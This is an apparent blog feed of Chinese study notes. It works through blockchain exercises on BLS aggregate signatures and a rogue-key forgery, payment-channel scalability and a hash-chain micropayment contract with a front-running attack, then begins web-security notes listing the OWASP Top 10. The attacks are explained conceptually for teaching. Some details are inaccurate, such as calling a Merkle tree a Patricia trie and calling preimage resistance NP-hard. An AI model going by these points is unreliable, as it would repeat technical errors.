公钥</u>不被重复使用,那么索引并无法发挥作用,起到节省交易空间的作用。并且这个方案的本质就是生成一个<u>全局键表</u>,那么这个表将会一直保留所有矿工的<u>Public Key 公钥</u>,除非增加内置的过期更新机制。 <strong>攻击</strong>:攻击者可以注册大量密钥并且从不使用它们, 从而填满表格。</p></blockquote><p><strong>23.d</strong>: 类似的方法对以太坊有意义吗?为什么或者为什么不?</p><blockquote><p>以太坊是一个基于账户的分类账, 所以关键的信息只被存储一次。 此外,由于以太坊在密钥恢复模式下的 ECDSA 验证期间重新获取它们的方式, <u>PublicKey 公钥</u>永远不会存储在链上(Ethereum 通过Signature重新推算出<u>PublicKey 公钥</u>)。 所以这个想法是行不通的。但是以太坊仍然可以切换到按顺序分配地址的模型, 而不是作为哈希值,这将使得与 <strong>23.a</strong> 部分的答案相当的节省。</p></blockquote><h2 id="aggregate-bls-signature-聚合签名">24.Aggregate BLS Signature聚合签名</h2><blockquote><p>聚合签名, 只需要一个签名, 而不是多个签名, 使用<strong>BilinearPairing 双线性映射</strong>函数。 这基于 <strong>Boneh–Lynn–Shacham(BLS)</strong> 数字签名:</p><ol type="1"><li><span class="math inline">\(GenKey() → x, g^{x}\)</span><ul><li>椭圆曲线上的点, 有时写为 <span class="math inline">\(x\)</span>,<span class="math inline">\(xG\)</span></li><li>与ECDSA类似</li><li><span class="math inline">\(Secret = x\)</span> (理解为私钥<spanclass="math inline">\(x\)</span>)</li><li>pk=<span class="math inline">\(g^{x}\)</span> (那么公钥就是<spanclass="math inline">\(g^{x}\)</span>)</li></ul></li><li><span class="math inline">\(Sign(x,m) → H(m)^{x}\)</span><ul><li>用Secret <span class="math inline">\(x\)</span> 对消息 <spanclass="math inline">\(m\)</span> 进行加密</li><li>哈希函数必须产生<em>pseudrandom 伪随机</em>曲线点<spanclass="math inline">\(H(m)^x\)</span></li></ul></li><li><span class="math inline">\(aggVerify(g^x, m_{1} \dots m_{m},\sigma_{*})\)</span><ol type="1"><li><span class="math inline">\(aggVerify(y = g^x, m, \sigma=H(m)^x) →e(g,\sigma) \overset{?}{=} e(g^x, H(m)) \\ e(g,H(m)^x) \overset{?}{=}e(g^x, H(m)) \\ e(g, H(m))^{\color{red}x} \overset{?}{=} e(g,H(m))^{\color{red}x}\)</span></li><li>双线性映射(曲线配对)函数: <spanclass="math inline">\(e\)</span></li><li>对 <u>generator 生成器</u>: <span class="math inline">\(g\)</span>&amp; <u>signature 签名</u>: <span class="math inline">\(\sigma\)</span>进行双线性映射<ul><li>(<span class="math inline">\(g^{x}\)</span> 理解为每个公钥)</li></ul></li><li>再发布<u>public key 公钥</u>: <spanclass="math inline">\(g^{x}\)</span> &amp; <u>pseudrandom伪随机曲线点</u>: <span class="math inline">\(H(m)^x\)</span>进行双线性映射</li><li>对比 2 &amp; 3 的映射结果是否相等, 如果相等证明<u>signature签名</u>是就是有效的</li><li>由于<span class="math inline">\(e\)</span>是<strong>Bilinear Pairing双线性映射</strong>, 即: <span class="math inline">\(e(g^a, h^b) = e(g,h)^{ab}\)</span><ul><li>所以: <span class="math inline">\(e(g,\sigma) \overset{?}{=} e(g^x,H(m))\)</span> 可以写作: <span class="math inline">\(e(g,H(m))^{\color{red}x} \overset{?}{=} e(g,H(m))^{\color{red}x}\)</span></li><li>所以可以保证签名验证的正确性</li></ul></li></ol></li></ol><p>注意:BLS复杂度要比ECDSA高上一个数量级。在验证区块中1000笔交易的聚合签名时,仍需要进行1000次配对计算,这可能比使用ECDSA时对1000个单独签名进行验证还要慢。唯一的好处在于,可以在区块中放更多笔的交易, 毕竟聚合签名只占32字节。 BLS可聚合签名,<u>节省区块时间</u>, 但对于<spanclass="math inline">\((m,n)\)</span>多重签名, 需要通信进行初始化过程,并且采用双线性映射会导致<u>配对效率低下</u>。</p><table><colgroup><col style="width: 13%" /><col style="width: 29%" /><col style="width: 30%" /><col style="width: 26%" /></colgroup><thead><tr class="header"><th></th><th>椭圆曲线数字签名算法 ECDSA</th><th>schnorr</th><th>BLS</th></tr></thead><tbody><tr class="odd"><td>验证多重签名</td><td>每个签名和公钥</td><td>每笔交易的合并签名和公钥[1]</td><td>每个区块的合并签名和公钥</td></tr><tr class="even"><td>随机数生成器</td><td>指定随机点</td><td>依赖随机数生成器</td><td>不需要随机数生成器</td></tr><tr class="odd"><td>签名者通信</td><td></td><td>需要</td><td>不需要</td></tr><tr class="even"><td>签名长度</td><td>320 bits</td><td>320 bits</td><td>160 bits</td></tr></tbody></table><p align="center">Table: ECDSA、schnorr和BLS签名算法对比</p></blockquote><p><strong>24.a</strong>: 证明, 如果每个独立的签名能被验证,那么聚合签眼可以通过验证。</p><blockquote><p>首先根据上述聚合签名(<spanclass="math inline">\(\sigma_{*}\)</span>)的定义,基于双线性映射(曲线配对)函数 (<spanclass="math inline">\(e\)</span>):</p><p>对于每个<span class="math inline">\(i\)</span>: <spanclass="math inline">\(e(g, \sigma_{i}) = e(g^{x_{i}},H(m_{i}))\)</span></p><p>那么聚合签名可以被验证: <span class="math inline">\(e(g, \sigma_{*})= \prod_{i} e(g^{x_{i}}, H(m_{i}))\)</span></p><p>即: <span class="math inline">\(e(g, \sigma_{*}) = e(g, \prod_{i}\sigma{i} )\)</span></p><p>根据<strong>Pairing corollary 映射推论</strong>, 我们可以将指数(<spanclass="math inline">\(\prod_{i}\)</span> 乘积)提出, 并得到: <spanclass="math inline">\(e(g, \sigma_{*}) = \prod_{i} e(g, \sigma{i})\)</span></p><p>那么我们可以得到: <span class="math inline">\(e(g, \sigma_{*}) =\prod_{i} e(g, H(m_{i}) )\)</span></p><p>即如果任意一个独立签名可以通过验证, 那么聚合签名也可以通过验证。</p></blockquote><p><strong>24.b</strong>:聚合签名通过验证并不意味着所有个人签名都是有效的。如果对一个相同的消息(<spanclass="math inline">\(m\)</span>)进行聚合签名。 假设Alice有一个公钥<spanclass="math inline">\(K_1\)</span>,假设一个攻击者正尝试通过Alice的签名伪造一个对于相同消息(<spanclass="math inline">\(m\)</span>)的聚合签名。攻击者首先随机生成一个随机值(<span class="math inline">\(y\)</span>),并计算出<span class="math inline">\(g^{y}\)</span>。 随后攻击者将<spanclass="math inline">\(g^{y}/K_{1}\)</span>当作其公钥<spanclass="math inline">\(K_{2}\)</span>。即: <spanclass="math inline">\(K_{2} = g^{y}K_{1}^{-1}\)</span>。那么乘积(会撤销掉<span class="math inline">\(K_{1}^{-1}\)</span>): <spanclass="math inline">\(K_{1}K_{2} = g^{y}\)</span>。攻击者可以控制输入消息<span class="math inline">\(m\)</span>,并基于<spanclass="math inline">\(y\)</span>对消息进行哈希以得到聚合签名: <spanclass="math inline">\(\sigma_{*} = H(m)^{y}\)</span>请证明这个伪造的聚合签名可以通过验证: <span class="math inline">\(e(g,\sigma_{*}) = \prod_{i=1}^{2} e(K_{i}, H(m))\)</span> 注意:攻击者并不知道所生成的公钥<spanclass="math inline">\(K_{2}\)</span>对应的私钥。</p><blockquote><p>那么在本题需要证明: <span class="math inline">\(e(g, \sigma_{*}) =e(K_{1}, H(m)) e(K_{2}, H(m))\)</span> 是否成立。 根据聚合签: <spanclass="math inline">\(e(g, \sigma_{*}) = e(g, H(m)^{ {\color{red}y}})\)</span> 根据<strong>Bilinearity 双线性</strong>: <spanclass="math inline">\(e(g, \sigma_{*}) = e(g^{ {\color{red}y} },H(m))\)</span> 攻击者选择的<span class="math inline">\(K_{2}\)</span>:<span class="math inline">\(K_{1}K_{2} = g^{ {\color{red}y} }\)</span>,即: <span class="math inline">\(e(g, \sigma_{*}) = e(K_{1}K_{2},H(m))\)</span> 最后根据<strong>Pairing corollary 映射推论</strong>:<span class="math inline">\(e(K_{1}, H(m)) e(K_{2}, H(m))\)</span> 那么,这证明攻击者可以通过Alice的公钥<spanclass="math inline">\(K_{1}\)</span>, 以及攻击者选择的<spanclass="math inline">\(K_{2}\)</span>, 和消息(<spanclass="math inline">\(m\)</span>)伪造一个Alice 和 Attacker共同的聚合签名。</p></blockquote><p><strong>24.c</strong>:为了防止<strong>24.b</strong>中提到的这种伪造的发生,需要保证每个消息(<span class="math inline">\(m\)</span>)都是唯一的,即计算聚合签名(<spanclass="math inline">\(\sigma_{*}\)</span>)需要知道每个单独消息(<spanclass="math inline">\(m_{i}\)</span>)的签名(<spanclass="math inline">\(\sigma_{i}\)</span>),这在加密货币环境中执行是否合理?</p><blockquote><p>是的, 这是合理的。因为对单个消息(<spanclass="math inline">\(m_{i}\)</span>)进行签名已经包含一个<strong>随机数nonce</strong>, 保证每个密钥 <span class="math inline">\(x_{i}\)</span>对每个独立的 (<span class="math inline">\(K_{i}\)</span>)都是唯一的。</p><p><strong>随机数 nonce</strong>: <span class="math inline">\((x ||r)\)</span>, 如果nonce有32bytes的长度就足够保证不易发生冲突 (<spanclass="math inline">\(r = 256 bits\)</span>)</p><p>这样保证: <span class="math inline">\(GenKey() → g^{x_{i}}\)</span>,每个公钥 <span class="math inline">\(g^{x_i}\)</span> doushi 都是唯一的,并被用来对每一个消息(<span class="math inline">\(m_i\)</span>)进行签名:<span class="math inline">\(Sign(g^{x_{i}}, m_{i}) →H(m_{i})^{x_{i}}\)</span></p><p>这样只要发现: <span class="math inline">\(e(K_{1}, H(m))\)</span> 与<span class="math inline">\(e(K_{2}, H(m))\)</span> 中的 (<spanclass="math inline">\(m\)</span>) 相同, 就可以阻止生成伪造聚合签名。另外一种思路是: 直接将<u>Private Key私钥</u>添加到每条正在签名的消息中。</p><p>即: 相比使用椭圆曲线上的点 <spanclass="math inline">\(g^{x}\)</span>, 另外加入(<spanclass="math inline">\(sk\)</span>): <spanclass="math inline">\(Sign(g^{x}, m, sk)\)</span></p></blockquote><h2 id="off-chain-payment-networks-链下支付网络">25.Off-Chain PaymentNetworks 链下支付网络</h2><p>我们知道可以通过<strong>链下支付渠道网络</strong>来改善比特币的<strong>Scalability可扩展性</strong>: - 在链下使用微支付通道网络处理大部分交易,从而解决比特币交易<u>Throughput 吞吐量</u>过小的问题; -并且由于交易都是在支付通道里处理的, 那么每笔链下无需等待多次区块确认,从而解决了比特币交易<u>Latency 延迟</u>的问题</p><p>那么假设有 <span class="math inline">\(N\)</span> 个用户,考虑两种<strong>联系支付渠道网络</strong>场景 (如下图所示)。</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206042100592.png" alt="24soloff_chain" style="zoom:50%;" /></p><ul><li><strong>Distributed Model 分布式模型</strong>:每个用户之间都有一条通道</li><li><strong>Hub-and-spoke Model 轴辐式模型</strong>:所有用户与中央枢纽之间都有一条通道</li></ul><p>假设所有支付渠道都是双向的。每个通道都有一个初始容量,余额可以在0与最大值之间双向偏离。如果执行的支付交易将通道余额增加到最大容量, 则重置通道。我们将考虑一个简单的模型, 即随机一个用户每秒向不同的随机用户发送 <spanclass="math inline">\(1\)</span> 个比特币。 假设总共有 <spanclass="math inline">\(N\)</span> 个用户, 每个用户愿意存入 <spanclass="math inline">\(M\)</span> 个比特币(每个人有 <spanclass="math inline">\(M\)</span> 个比特币)。</p><p><strong>25.a</strong>: 对于以上2种<strong>支付渠道网络模型</strong>,<span class="math inline">\(N\)</span> 个用户一共需要多少条通道?</p><blockquote><ul><li><strong>Hub-and-spoke Model 轴辐式模型</strong>: <spanclass="math inline">\(N\)</span></li><li><strong>Distributed Model 分布式模型</strong>: <spanclass="math inline">\({ {N}\choose{2}} = N(N−1)/2\)</span></li></ul></blockquote><p><strong>25.b</strong>: 对于以上2种<strong>支付渠道网络模型</strong>,假设用户将他们的总硬币数 <span class="math inline">\(M\)</span> 平分,每个通道的双向容量将是多少? 注意：如果双向通道的容量为<spanclass="math inline">\(X\)</span>, 那么存入的币则为<spanclass="math inline">\(2X\)</span>。</p><blockquote><p>已知每个人有 <span class="math inline">\(M\)</span> 个比特币,那么整个网络的比特币总数为: <span class="math inline">\(MN\)</span>所以每条通道的容量 <span class="math inline">\(X\)</span> 为: -<strong>Hub-and-spoke Model 轴辐式模型</strong>: - 总币数(<spanclass="math inline">\(MN\)</span>) ÷ 总人数<spanclass="math inline">\(N\)</span> ÷ 双向通道容量(<spanclass="math inline">\(2\)</span>) - <spanclass="math inline">\(M\frac{\frac{N}{N}}{2} = \frac{M}{2}\)</span> -<strong>Distributed Model 分布式模型</strong>: <spanclass="math inline">\(\frac{M/{ {N}\choose{2}}}{2}\)</span> -总币数(<span class="math inline">\(MN\)</span>) ÷ 总人数 <spanclass="math inline">\({ {N}\choose{2}}\)</span> ÷ 双向通道容量(<spanclass="math inline">\(2\)</span>) - <spanclass="math inline">\(N\frac{\frac{M}{\left(N\frac{\left(N-1\right)}{2}\right)}}{2}= \frac{M}{N-1}\)</span></p></blockquote><p><strong>25.c</strong>: 随机一笔交易通过一条通道的概率为多少?</p><blockquote><ul><li><strong>Hub-and-spoke Model 轴辐式模型</strong>:<ul><li>首先, 总共有多少种独特的双向交易?<ul><li>以图为例: <span class="math inline">\(\{ A → B, A → C, A → D, B → C,B → D, C → D \}: 共6种\)</span></li><li>所以其实也是: <span class="math inline">\({N \choose 2} =N(N-1)/2\)</span></li></ul></li><li>其次, 每种独特的双向交易用到的的交易类型有几种?<ul><li>以 <span class="math inline">\(A → Hub\)</span> 为例: <spanclass="math inline">\(\{ A → B, A → C, A → D \}\)</span></li><li>其他以此类推每种独特的双向交易可以处理: <spanclass="math inline">\(N-1\)</span> 3种交易</li><li>所以我们总共有 <span class="math inline">\(N(N-1)/2\)</span>种不同的交易通道, 对于每个用户都有 <spanclass="math inline">\(N-1\)</span> 种不同的交易类型。</li></ul></li><li>那么随机一笔交易被, 某一段交易通道处理的概率为: <spanclass="math inline">\(\frac{N-1}{N(N-1)/2} ={\color{green}{\frac{2}{N}}}\)</span></li></ul></li><li><strong>Distributed Model 分布式模型</strong>:<ul><li>首先, 总共有多少种独特的双向交易?: 与<strong>Hub-and-spoke Model轴辐式模型</strong>相同为: <spanclass="math inline">\(N(N-1)/2\)</span></li><li>其次, 每种独特的双向交易用到的的交易类型有几种?<ul><li>以 <span class="math inline">\(A → B\)</span> 为例: 只有 <spanclass="math inline">\(\{ A → B \}\)</span> 这一种交易类型</li><li>其他以此类推每种独特的双向交易可以处理: 1 种交易</li><li>所以我们总共有 <span class="math inline">\(N(N-1)/2\)</span>种不同的交易通道, 对于每个用户都有 <spanclass="math inline">\(1\)</span> 种不同的交易类型。</li></ul></li><li>那么随机一笔交易被, 某一段交易通道处理的概率为: <spanclass="math inline">\(\frac{1}{N(N-1)/2} ={\color{green}{\frac{2}{N(N-1)}}}\)</span></li></ul></li></ul></blockquote><p><strong>25.d</strong>: 对于以上2种<strong>支付渠道网络模型</strong>,计算对于处理所有链上支付的长期<u>ScalabilityImprovement可扩展性改进</u>。简单来说就是,计算所有支付都出现在链上时所需的<u>链上交易数量</u>与支付渠道模型中所需<u>链上交易数量</u>的比率。</p><p>注意: 重置通道需要两个事务。</p><p>提示: <u>Theory of Random Walks 随机游走理论</u>的一个有用事实是:<span class="math inline">\(nm\)</span> 是 "完成时间"(从 0开始)的上下边界 <span class="math inline">\((n, -m)\)</span>。 例如:在容量为 <span class="math inline">\(n\)</span> 的单个通道中,在余额到达<span class="math inline">\(\pm{n}\)</span>之前,大概可以发生<span class="math inline">\(n^{2}\)</span>次往返支付;最后只有在一个余额到达 <span class="math inline">\(\pm{n}\)</span> 之后,通道才会被重置。</p><p>注意: 在任何情况下无论通道的数量是多少,每次支付都只会随机选择一个通道处理支付。在稳定状态下,每一笔交易都处在生命周期中的某个随机点; 每处理一笔额外的支付,可能导致发生重置的概率在任何时候都是保持恒定的。也就是说每个新的支付导致发生重置概率是恒定的: <spanclass="math inline">\(\frac{1}{交易通过某条通道的概率}\)</span></p><blockquote><ul><li><strong>Hub-and-spoke Model 轴辐式模型</strong>: <spanclass="math inline">\(1/ {\color{green}{\frac{2}{N}}} ={\color{green}{\frac{N}{2}}}\)</span><ul><li>已知初始通道容量为: <spanclass="math inline">\(\frac{M}{2}\)</span>, 即通道的上下边界为 <spanclass="math inline">\(\pm{\frac{M}{2}}\)</span></li><li>并且, 对于上下边界 <span class="math inline">\((n, -n)\)</span>,在发生重置之前需要经历: <span class="math inline">\(N^{2}\)</span>的时间</li><li>所以预期在通道执行 <span class="math inline">\((\frac{M}{2})^{2} =\frac{M^{2}}{4}\)</span> 次支付后, 通道会被重置</li><li>由于在轴辐式模型中每笔次往返支付需要经历<spanclass="math inline">\(2\)</span>条通道, 所以预计 <spanclass="math inline">\(\frac{M^{2}}{4} / 2 = \frac{M^{2}}{8}\)</span>次支付后, 通道会被重置</li><li>最后因为每笔往返支付需要<spanclass="math inline">\(2\)</span>比交易, 所以预计: <spanclass="math inline">\(\frac{M^{2}}{8} / 2 ={\color{green}{\frac{M^{2}}{16}}}\)</span> 次交易后通道会被重置</li><li>即在链下执行了: <spanclass="math inline">\({\color{green}{\frac{M^{2}}{16}}}\)</span> 次交易,再发布到链上, 从而改善了可扩展性。</li></ul></li><li><strong>Distributed Model 分布式模型</strong>: <spanclass="math inline">\(1 / {\color{green}{\frac{2}{N(N-1)}}} ={\color{green}{\frac{N(N-1)}{2}}}\)</span><ul><li>已知初始通道容量为: <spanclass="math inline">\(\frac{M}{N-1}\)</span>, 即通道的上下边界为 <spanclass="math inline">\(\pm{\frac{M}{N-1}}\)</span></li><li>所以预期在通道执行 <span class="math inline">\((\frac{M}{N-1})^{2} =\frac{M^2}{(N-1)^2}\)</span> 次支付后, 通道会被重置</li><li>分布式模型中每笔次往返支付仅需经历<spanclass="math inline">\(1\)</span>条通道</li><li>最后因为每笔往返支付需要<spanclass="math inline">\(2\)</span>比交易, 所以预计: <spanclass="math inline">\(\frac{M^2}{(N-1)^2} / 2 ={\color{green}{\frac{M^2}{2(N-1)^2}}}\)</span> 次交易后通道会被重置</li><li>即在链下执行了: <spanclass="math inline">\({\color{green}{\frac{M^2}{2(N-1)^2}}}\)</span>次交易, 再发布到链上, 从而改善了可扩展性。</li></ul></li></ul></blockquote><p><strong>25.e</strong>: Hub-and-spoke Model 轴辐式模型有哪些缺点?</p><blockquote><p>不难看出, 每笔支付都需要通过中心点。 对于这样一个过渡中心化的模型,一旦中心点出现故障, 所有交易都无法被处理。 所以该模型的可靠性偏差。</p><p>并且中心点可以了解每个人的渠道使用模式。</p><p>由于没有中心点就无法处理支付, 中心点可以审查或收取高额费用。</p></blockquote><p><strong>25.f</strong>:为什么这个问题中的随机支付模型是不现实的？简要描述如何通过利用更现实的付款分配来提高效率。</p><blockquote><p>每一个用户,可能永远都不会向网络中绝大多数的其他用户发起支付。所以事实上,无法知道所有用户的空间。 所以现实中,一个用户只在第一次与另一个用户交易时开启一个支付通道,而不是提前向所有用户开放通道。</p><p>并且现实中用户对通道容量的分配很可能是不均匀的,用户会将更多容量放在常用的通道上。</p></blockquote><h2 id="ethereum-micropayments-以太坊小额支付">26.Ethereum Micropayments以太坊小额支付</h2><p><u>Protocol for Serial Micropayments in Bitcoin比特币序列微支付协议</u>: Alice 想向 Bob 发起一系列付款, 因此她将 <spanclass="math inline">\(n\)</span> 个单位的货币存入一个 <strong>ESCROWAccount 托管账户</strong>, 该账户是 Alice 和 Bob 共享的多<strong>MutiSig Account 重签名账户</strong>。</p><p>然后Alice反复对多笔交易进行签名:</p><table><thead><tr class="header"><th></th><th>Alice 返还</th><th>Bob 收到</th></tr></thead><tbody><tr class="odd"><td>Tx-1</td><td>n-1</td><td>1</td></tr><tr class="even"><td>Tx-2</td><td>n-2</td><td>2</td></tr><tr class="odd"><td>...</td><td>...</td><td>...</td></tr></tbody></table><p>依此类推。 Alice可以随时停止发送交易, 而 Bob 签名&amp;公布:收到的最后一笔交易。 <code>time-locked</code> 时间锁的退款交易, 保证Alice 可以收已发起转账, 如果 Bob 超时未答复 (Bob 离线)。让我们考虑在以太坊中解决这个问题。实现上述逻辑非常容易。我们实际上可以添加一个功能使:每个小额支付只需要Hash, 而不是签名。这对于轻量级客户端来说是完美的(尽管初始化仍需要对消息签名)。</p><p>该方案的工作原理如下:</p><ol type="1"><li>Alice 选择一个随机数 <span class="math inline">\(X\)</span>,然后计算 <span class="math inline">\(Y = H^{n}(X)\)</span><ul><li>从(<span class="math inline">\(X\)</span>)开始重复执行(<spanclass="math inline">\(n\)</span>)次哈希函数(<spanclass="math inline">\(H\)</span>)</li><li>例如: <span class="math inline">\(n = 2\)</span>, 那么重复执行 <spanclass="math inline">\(2\)</span> 次: <span class="math inline">\(Y =H(H(X))\)</span></li></ul></li><li>Alice 创建一个包含 <span class="math inline">\(n\)</span>个币的合约, 并将 <span class="math inline">\(Y\)</span> 值嵌入到合约中<ul><li>同时将 <span class="math inline">\(Y\)</span> 发送给 Bob</li></ul></li><li>Alice 将 <span class="math inline">\(Z\)</span> 值发送给 Bob<ul><li>(<span class="math inline">\(Z = H^{n-k}(X)\)</span>), 以将 <spanclass="math inline">\(k\)</span> 个币 (<span class="math inline">\(k&lt; n\)</span>) 支付给 Bob。</li><li>n-k, 因为例如: n = 10, k = 3, 那么 Alice 转账3给 Bob直到还剩(10-3=7)的时候会停止扣款。</li></ul></li></ol><p><strong>26.a</strong>: 通过伪代码描述, 合约如何决定向 Alice 或 Bob发送多少币? 最后以调用 <code>SELFDESTRUCT</code> 函数来结束。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先 Bob 将 Alice 给他的 Z 值发送给合约</span><br><span class="line">合约收到 Z 开始执行: </span><br><span class="line"></span><br><span class="line">    current = Z</span><br><span class="line">    count = 0</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * 如果提交格式不正确的Z, 可能导致无限循环, 最后耗尽GAS;</span><br><span class="line">    * 更好的版本应该保证如果计算超过 n 个哈希, 则 break。</span><br><span class="line">    */</span><br><span class="line">    while True:</span><br><span class="line">        if current == Y:         // &lt;- 到达规定次数, 此处可能一直找不到Y, 导致Massive Loop</span><br><span class="line">            break</span><br><span class="line">        else: </span><br><span class="line">            current = H(current) // &lt;- 没达到规定次数, 继续执行(类似洋葱剥皮)</span><br><span class="line">            count += 1           // &lt;- 计数器 +1</span><br><span class="line">    // 根据计数器结果执行转账 </span><br><span class="line">    Bob.transfer(count)          </span><br><span class="line">    Alice.transfer(n - count)</span><br></pre></td></tr></table></figure><p><strong>26.b</strong>: 描述Alice 如何实现一个 <strong>Front-runningAttack 抢先攻击</strong>,试图让合约支付给鲍勃的费用低于她实际授权的金额。又该如何设计合约来防止这种攻击?</p><blockquote><p><strong>攻击</strong>: 由于 <span class="math inline">\(Y\)</span>值是由 Alice 计算的, 那么 Alice 可以直接将 <spanclass="math inline">\(Y\)</span> 值当作 <spanclass="math inline">\(Z\)</span> 发送给合约, 那么合约将直接终止, 这样Bob 无法获得任何转账。</p><p><strong>防范</strong>:</p><ol type="1"><li>规定 Z 值只能由 Bob 提供,<code>require(msg.sender = Bob)</code></li><li>或如果任何人都可以提供 Z 值, 那么可以增加 <u>Challenge Period挑战期</u> 来选出在到达 Y 值之前需要哈嘻次数最多的 Z 值。</li></ol></blockquote><p><strong>26.c</strong>: 哈希函数应该满足什么安全属性来确保 Bob不能窃取比 Alice 打算给他的钱更多的钱?</p><blockquote><p>需要<strong>原像防御(Pre-Image resistance)</strong>:就是任意给一个hash值 <spanclass="math inline">\({\color{green}{Z}}\)</span>, 你很难破解出它的原像<span class="math inline">\({\color{green}{X}}\)</span>, 使得 <spanclass="math inline">\(H{\color{red}{^{n-k}(X_{Bob})}}=({\color{green}{Z}})\)</span>,这个难度一般是NP难度的, 也就是所谓的单向函数。</p><ul><li><strong>强碰撞防御(Collision resistance)</strong> 比<strong>原像防御(Pre-Image resistance)</strong> 的安全性更高:<ul><li><p><strong>强碰撞防御(Collision resistance)</strong>:就是你很难找到<u>两个不同的</u><spanclass="math inline">\({\color{green}{X_{Alice}}}\)</span> 和 <spanclass="math inline">\({\color{red}{X_{Bob}}}\)</span>, 使得<spanclass="math inline">\(H{\color{red}{^{n-k}(X_{Bob})}}=H^{n-k}({\color{green}{X_{Alice}}})\)</span>。</p></li><li><p>但由于 <span class="math inline">\(X\)</span> 已经是一个由 Alice选择的 nonce 随机数, 已经做到了强防碰撞;所以主要需要考虑<strong>原像防御</strong>。</p></li></ul></li></ul></blockquote><p><strong>26.d</strong>: 对于给定的 <spanclass="math inline">\(n\)</span> 和 <spanclass="math inline">\(k\)</span>, 这个协议有多昂贵: 在分配资金之前,合约需要计算多少哈希? Alice 和 Bob 需要存储多少数据?</p><blockquote><p>Alice 和 Bob 都只需要存储一个值</p><p>Alice 也可能会选择存储更多以限制她每次支付计算的哈希数,并存在一个线性的时间复杂度&amp;空间复杂度之间的权衡</p><p>合约只需要存储 Y 值, 所以空间复杂度只有: <spanclass="math inline">\(O(1)\)</span>, 但合约需要执行 <spanclass="math inline">\(k\)</span> 次哈希函数, 所以时间复杂度为: <spanclass="math inline">\(O(n)\)</span>。</p></blockquote><p><strong>26.e</strong>: 在实践中,我们希望最大限度地减少合约消耗的资源, 因为 gas价格昂贵。由于上述方案是一个线性链, 可以使用树结构进行改进。描述这个树结构; 并就 <span class="math inline">\(n\)</span> 和 <spanclass="math inline">\(k\)</span> 而言, 给出对于Alice, Bob &amp; Contract来说这个树结构的存储空间和计算时间的成本分别是多少?</p><blockquote><p>这个树结构就是: Melkle Patricia Trie (MPT)</p><p>为简单起见, 假设<spanclass="math inline">\(n\)</span>的最大容量是<spanclass="math inline">\(2\)</span>的偶数次幂 (例如: <spanclass="math inline">\(2^{2}, 2^{4}, 2^{8}, \dots\)</span>)</p><p>Alice 对一棵深度为 <span class="math inline">\(\log(n)\)</span>,叶子节点为 <span class="math inline">\(y_{i}=H(x_{i})\)</span> [<spanclass="math inline">\(x_{i}\)</span>是随机值] 的MPT树进行计算。</p><p>为了节省空间, Alice 可以伪随机地生成这些 <spanclass="math inline">\(x_{i}\)</span> 值; 例如: 通过 <spanclass="math inline">\(PRG(i, key)\)</span> 函数生成 Alice 所需的所有<u>Secret Key 密钥</u>。 随后 Alice 可以计算这棵树</p><p><strong>Merkle Root 默克尔根</strong> <spanclass="math inline">\(r\)</span> 并将其发布到链上。</p><p>那么 Alice 可以通过将 <span class="math inline">\(x_{k}\)</span>发送给 Bob (<span class="math inline">\(k\)</span>: 为需要转账的金额)并且包含对应的 <strong>Merkle Inclusion Proof 默克尔包含证明</strong>,那么总计为发送了 <span class="math inline">\(1 + \log(n)\)</span> 个值给Bob (<span class="math inline">\(\log(n)\)</span>: 为默克尔树的深度,同样也是默克尔包含证明的所需步数)。</p><p>对于 Bob 他只需将收到的 <strong>Merkle Inclusion Proof默克尔包含证明</strong> (<span class="math inline">\(\log(n)\)</span>)发送给contract, 并进行 <span class="math inline">\(O(\log(n))\)</span>次哈希计算。</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206042101839.png" alt="26eEthMicrosol" style="zoom:40%;" /></p><p>如上图所示: 注意, Alice 生成的 <spanclass="math inline">\(x_i\)</span> 值不能直接存放在 MPT 的叶子结点,因为这样会导致 <span class="math inline">\(x_{i}\)</span>值的不安全。例如: 如果将 <span class="math inline">\(x_{6},x_{7}\)</span> 直接存放在 <span class="math inline">\(y_{6},y_{7}\)</span> 的位置, 那么攻击者可以利用已知的 <spanclass="math inline">\(x_{6}\)</span> 的包含证明去揭露 <spanclass="math inline">\(x_{7}\)</span> 的值。所以需要像比特币中 MPT存储交易一样, 将每一个 <span class="math inline">\(x_{i}\)</span>对应到一个叶子结点 <span class="math inline">\(y_{i}\)</span> 上。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="unimelb" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/"/>
    
    <category term="MIT" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/MIT/"/>
    
    
    <category term="unimelb" scheme="https://yumtaro.com/tags/unimelb/"/>
    
  </entry>
  
  <entry>
    <title>COMP90074 网络安全</title>
    <link href="https://yumtaro.com/archives/7861b756.html/"/>
    <id>https://yumtaro.com/archives/7861b756.html/</id>
    <published>2022-04-23T08:06:37.000Z</published>
    <updated>2022-06-12T16:27:44.015Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- # COMP90074 Web Security 网络安全 --><h2 id="前置知识">前置知识</h2><p><strong>OWASP Top 10 web vulnerabilities (2017)</strong></p><ol type="1"><li>Injection</li><li>Broken Authentication</li><li>Sensitive Data Exposure</li><li>XML External Entities (XEE)</li><li>Broken Access Control</li><li>Security Misconfiguration</li><li>Cross-Site Scripting (XSS)</li><li>Insecure Deserialization</li><li>Using Component with Known Vulnerabilities</li><li>Insufficient Logging &amp; Monitoring</li></ol><p><strong>Useful Link</strong></p><ol type="1"><li><a href="https://portswigger.net/web-security/all-labs">PortsiggerAll Labs</a></li><li><ahref="https://github.com/swisskyrepo/PayloadsAllTheThings">github:Payloads All The Things</a></li></ol><p><strong>Terminology</strong></p><blockquote><table><colgroup><col style="width: 45%" /><col style="width: 54%" /></colgroup><thead><tr class="header"><th>Term</th><th>Des</th></tr></thead><tbody><tr class="odd"><td>Server 服务器</td><td>-</td></tr><tr 